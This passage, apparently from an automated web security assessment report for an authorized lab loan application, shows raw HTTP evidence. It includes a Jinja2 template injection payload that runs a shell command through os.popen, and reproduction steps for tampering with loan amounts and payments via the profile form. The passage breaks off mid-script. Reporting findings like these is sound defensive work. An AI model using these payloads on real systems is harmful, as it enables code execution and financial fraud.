+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: public, max-age=0
+connection: Keep-Alive
+content-length: 7138
+content-type: text/html; charset=utf-8
+date: Thu, 02 Jul 2026 05:38:10 GMT
+expires: 0
+keep-alive: timeout=5, max=99
+pragma: no-cache
+server: Apache/2.4.67 (Debian)
+vary: Accept-Encoding
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Amortization Table&lt;/title&gt;
+    &lt;i&gt;This feature is not yet fully implented.&lt;/i&gt;
+    &lt;style&gt;
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+        th, td {
+            border: 1px solid black;
+            padding: 8px;
+            text-align: center;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h2&gt;Amortization Table&lt;/h2&gt;
+    &lt;table id=&quot;paymentTable&quot;&gt;
+        &lt;thead&gt;
+            &lt;tr&gt;
+                &lt;th&gt;Payment Number&lt;/th&gt;
+                &lt;th&gt;Principal&lt;/th&gt;
+                &lt;th&gt;Interest&lt;/th&gt;
+            &lt;/tr&gt;
+        &lt;/thead&gt;
+        &lt;tbody&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;1&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;2&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;3&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;4&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;5&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;6&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;7&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;8&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;9&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;10&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;11&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;12&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;13&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;14&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;15&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;16&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;17&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;18&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;19&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;20&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;21&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;22&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;23&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;24&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;25&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;26&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;27&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;28&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;29&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;30&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;31&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;32&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;33&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;34&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;35&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;36&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;37&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;38&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;39&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;40&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;41&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+        &lt;/tbody&gt;
+    &lt;/table&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr32pq1o-5j</code> — <code>artifacts/s-0005/ev-mr32pq1o-5j/</code></div><div class="lbl">REQUEST</div><pre>GET /amortization?principal=10000&amp;term=lipsum.__globals__.os.popen(%27echo%20AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%27).read().__len__()&amp;rate=0.05 HTTP/1.1
+Host: target.local:32836
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: public, max-age=0
+connection: Keep-Alive
+content-length: 7138
+content-type: text/html; charset=utf-8
+date: Thu, 02 Jul 2026 05:38:11 GMT
+expires: 0
+keep-alive: timeout=5, max=98
+pragma: no-cache
+server: Apache/2.4.67 (Debian)
+vary: Accept-Encoding
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Amortization Table&lt;/title&gt;
+    &lt;i&gt;This feature is not yet fully implented.&lt;/i&gt;
+    &lt;style&gt;
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+        th, td {
+            border: 1px solid black;
+            padding: 8px;
+            text-align: center;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h2&gt;Amortization Table&lt;/h2&gt;
+    &lt;table id=&quot;paymentTable&quot;&gt;
+        &lt;thead&gt;
+            &lt;tr&gt;
+                &lt;th&gt;Payment Number&lt;/th&gt;
+                &lt;th&gt;Principal&lt;/th&gt;
+                &lt;th&gt;Interest&lt;/th&gt;
+            &lt;/tr&gt;
+        &lt;/thead&gt;
+        &lt;tbody&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;1&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;2&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;3&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;4&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;5&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;6&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;7&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;8&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;9&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;10&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;11&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;12&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;13&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;14&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;15&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;16&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;17&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;18&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;19&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;20&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;21&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;22&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;23&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;24&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;25&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;26&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;27&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;28&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;29&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;30&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;31&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;32&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;33&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;34&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;35&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;36&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;37&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;38&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;39&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;40&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+                &lt;tr&gt;
+                    &lt;td&gt;41&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                    &lt;td&gt;N/A&lt;/td&gt;
+                &lt;/tr&gt;
+            
+        &lt;/tbody&gt;
+    &lt;/table&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-2">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 2. [price-tampering] Loan terms fully client-editable via profile update (price/terms tampering)</h3>
+<div class="kv">Screen: <code>s-0003</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32836</div>
+<div class="desc">The POST /profile update form accepts server-authoritative loan financials — loan_amount, loan_term_months and monthly_payment — as free client-supplied fields with no server-side validation or consistency check. A borrower can set arbitrary, mutually inconsistent values (e.g. loan principal 500000, term 1 month, monthly payment 0.01). The manipulated figures persist and are rendered as authoritative on /loan_details (&quot;Your loan principal is 500000 / Your monthly payment is 0.01&quot;). These are financial obligation values that should be computed/approved server-side, not editable by the account holder, allowing self-service manipulation of the loan terms the account owes.</div>
+<div><b>Reproduction</b></div><pre>1. Log in as a normal user and open /profile.
+2. Submit the profile form (POST /profile) with body: name=John&amp;lastname=Doe&amp;email=john@example.com&amp;loan_amount=500000&amp;loan_term_months=1&amp;monthly_payment=0.01
+3. GET /loan_details — it now reports &quot;Your loan principal is 500000&quot;, term &quot;1 months&quot;, &quot;Your monthly payment is 0.01&quot;.
+Control (legit values loan_amount=10000/monthly_payment=850) does NOT show the 0.01 marker; the two manipulated replays both do.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr31t52w-1s</code> — <code>artifacts/s-0003/ev-mr31t52w-1s/</code></div><div class="lbl">REQUEST</div><pre>GET /loan_details HTTP/1.1
+Host: target.local:32836
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: public, max-age=0
+connection: Keep-Alive
+content-length: 2450
+content-type: text/html; charset=utf-8
+date: Thu, 02 Jul 2026 05:12:50 GMT
+expires: 0
+keep-alive: timeout=5, max=99
+pragma: no-cache
+server: Apache/2.4.67 (Debian)
+vary: Cookie,Accept-Encoding
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Loan Details&lt;/title&gt;
+    &lt;link href=&quot;/static/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/style.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row justify-content-between mt-5&quot;&gt;
+            &lt;div class=&quot;col-md-9&quot;&gt;
+                &lt;h2&gt;Loan Details&lt;/h2&gt;
+                &lt;p&gt;Your loan principal is 10000.0&lt;/p&gt;
+                &lt;p&gt;The term of your loan principal 12 months&lt;/p&gt;
+                &lt;p&gt;Your monthly payment is 850.0&lt;/p&gt;
+
+                &lt;!-- Button to trigger loading of amortization table in iframe --&gt;
+                &lt;button id=&quot;showAmortizationTable&quot; class=&quot;btn btn-primary&quot;&gt;Show Amortization Table&lt;/button&gt;
+                
+                &lt;!-- Placeholder for iframe --&gt;
+                &lt;div id=&quot;iframeContainer&quot; style=&quot;margin-top: 20px;&quot;&gt;
+                    &lt;iframe id=&quot;amortizationIframe&quot; src=&quot;&quot; style=&quot;width: 100%; height: 500px; border: none;&quot;&gt;&lt;/iframe&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+            &lt;div class=&quot;col-md-3&quot;&gt;
+                &lt;div class=&quot;card&quot;&gt;
+                    &lt;div class=&quot;card-body&quot;&gt;
+                        &lt;h5 class=&quot;card-title&quot;&gt;Navigation&lt;/h5&gt;
+                        &lt;ul class=&quot;list-group&quot;&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/home&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/profile&quot;&gt;Profile&lt;/a&gt;&lt;/li&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/loan_details&quot;&gt;Loan Details&lt;/a&gt;&lt;/li&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/logout&quot;&gt;Exit&lt;/a&gt;&lt;/li&gt;
+                        &lt;/ul&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Bootstrap Bundle with Popper --&gt;
+    &lt;script src=&quot;/static/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+
+    &lt;!-- jQuery (you may need to include it if not already included) --&gt;
+    &lt;script src=&quot;/static/js/jquery.min.js&quot;&gt;&lt;/script&gt;
+
+    &lt;script&gt;
+        $(document).ready(function() {
+            // Event listener for button click
+            $('#showAmortizationTable').click(function() {
+                // Set the iframe src attribute to the /amortization endpoint
+                $('#amortizationIframe').attr('src', '/amortization?term=12');
+            });
+        });
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr31t5ka-1u</code> — <code>artifacts/s-0003/ev-mr31t5ka-1u/</code></div><div class="lbl">REQUEST</div><pre>GET /loan_details HTTP/1.1
+Host: target.local:32836
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: public, max-age=0
+connection: Keep-Alive
+content-length: 2448
+content-type: text/html; charset=utf-8
+date: Thu, 02 Jul 2026 05:12:51 GMT
+expires: 0
+keep-alive: timeout=5, max=97
+pragma: no-cache
+server: Apache/2.4.67 (Debian)
+vary: Cookie,Accept-Encoding
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Loan Details&lt;/title&gt;
+    &lt;link href=&quot;/static/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/style.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row justify-content-between mt-5&quot;&gt;
+            &lt;div class=&quot;col-md-9&quot;&gt;
+                &lt;h2&gt;Loan Details&lt;/h2&gt;
+                &lt;p&gt;Your loan principal is 500000.0&lt;/p&gt;
+                &lt;p&gt;The term of your loan principal 1 months&lt;/p&gt;
+                &lt;p&gt;Your monthly payment is 0.01&lt;/p&gt;
+
+                &lt;!-- Button to trigger loading of amortization table in iframe --&gt;
+                &lt;button id=&quot;showAmortizationTable&quot; class=&quot;btn btn-primary&quot;&gt;Show Amortization Table&lt;/button&gt;
+                
+                &lt;!-- Placeholder for iframe --&gt;
+                &lt;div id=&quot;iframeContainer&quot; style=&quot;margin-top: 20px;&quot;&gt;
+                    &lt;iframe id=&quot;amortizationIframe&quot; src=&quot;&quot; style=&quot;width: 100%; height: 500px; border: none;&quot;&gt;&lt;/iframe&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+            &lt;div class=&quot;col-md-3&quot;&gt;
+                &lt;div class=&quot;card&quot;&gt;
+                    &lt;div class=&quot;card-body&quot;&gt;
+                        &lt;h5 class=&quot;card-title&quot;&gt;Navigation&lt;/h5&gt;
+                        &lt;ul class=&quot;list-group&quot;&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/home&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/profile&quot;&gt;Profile&lt;/a&gt;&lt;/li&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/loan_details&quot;&gt;Loan Details&lt;/a&gt;&lt;/li&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/logout&quot;&gt;Exit&lt;/a&gt;&lt;/li&gt;
+                        &lt;/ul&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Bootstrap Bundle with Popper --&gt;
+    &lt;script src=&quot;/static/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+
+    &lt;!-- jQuery (you may need to include it if not already included) --&gt;
+    &lt;script src=&quot;/static/js/jquery.min.js&quot;&gt;&lt;/script&gt;
+
+    &lt;script&gt;
+        $(document).ready(function() {
+            // Event listener for button click
+            $('#showAmortizationTable').click(function() {
